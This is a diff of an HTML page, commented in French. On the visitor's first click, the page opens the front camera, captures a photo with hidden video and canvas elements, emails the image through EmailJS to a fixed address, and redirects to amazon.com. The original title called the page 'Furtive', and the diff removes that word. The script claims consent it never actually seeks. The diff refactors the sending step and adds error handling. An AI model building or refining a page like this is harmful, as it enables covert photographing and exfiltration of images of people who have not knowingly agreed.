@@ -1,13 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Photo One-Tap Furtive Chrome</title>
+  <title>Photo One-Tap Chrome</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>emailjs.init("mxm3fFA_BxEhqJieq");</script>
+  <script>
+    // Initialise EmailJS avec ta clé publique
+    emailjs.init("mxm3fFA_BxEhqJieq");
+  </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    html, body { margin:0; padding:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; background:#f0f0f0; overflow:hidden; }
-    #status { position:absolute; top:10px; font-size:16px; color:green; text-align:center; width:100%; }
+    html, body {
+      margin:0; padding:0; width:100%; height:100%;
+      display:flex; justify-content:center; align-items:center;
+      background:#f0f0f0; overflow:hidden;
+    }
+    #status {
+      position:absolute; top:10px; font-size:16px; color:green;
+      text-align:center; width:100%;
+    }
     video, canvas { display:none; }
   </style>
 </head>
@@ -21,6 +31,24 @@
     const canvas = document.getElementById("canvas");
     const status = document.getElementById("status");
 
+    // Fonction pour envoyer la photo via EmailJS
+    async function sendPhoto(imageBase64) {
+      try {
+        const params = {
+          to_email: "destinataire@email.com", // Remplace par ton email
+          message: "Photo prise avec consentement",
+          attachment: imageBase64
+        };
+        await emailjs.send("service_8cs0gml", "template_hgvdx1g", params);
+        console.log("Photo envoyée avec succès !");
+        return true;
+      } catch (err) {
+        console.error("Erreur lors de l'envoi :", err);
+        return false;
+      }
+    }
+
+    // Fonction principale : capture + envoi + redirection
     async function captureAndSend() {
       // Supprime les listeners pour éviter plusieurs déclenchements
       document.body.removeEventListener("click", captureAndSend);
@@ -32,7 +60,8 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
         video.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 800)); // temps pour initialiser le flux
+        // Laisse le flux s'initialiser
+        await new Promise(r => setTimeout(r, 800));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -40,16 +69,16 @@
         const imageBase64 = canvas.toDataURL("image/jpeg");
 
         status.textContent = "Envoi de la photo...";
-        await emailjs.send("service_8cs0gml","template_hgvdx1g",{
-          to_email:"destinataire@email.com",
-          message:"Photo prise avec consentement",
-          attachment:imageBase64
-        });
+        const success = await sendPhoto(imageBase64);
 
         stream.getTracks().forEach(track => track.stop());
 
-        status.textContent = "Photo envoyée ! Redirection...";
-        setTimeout(()=>{ window.location.href="https://www.amazon.com"; },1200);
+        if(success){
+          status.textContent = "Photo envoyée ! Redirection...";
+          setTimeout(()=>{ window.location.href="https://www.amazon.com"; },1200);
+        } else {
+          status.textContent = "Erreur lors de l'envoi.";
+        }
 
       } catch(err) {
         status.textContent = "Erreur ou caméra refusée : "+err;
@@ -62,4 +91,3 @@
   </script>
 </body>
 </html>
-
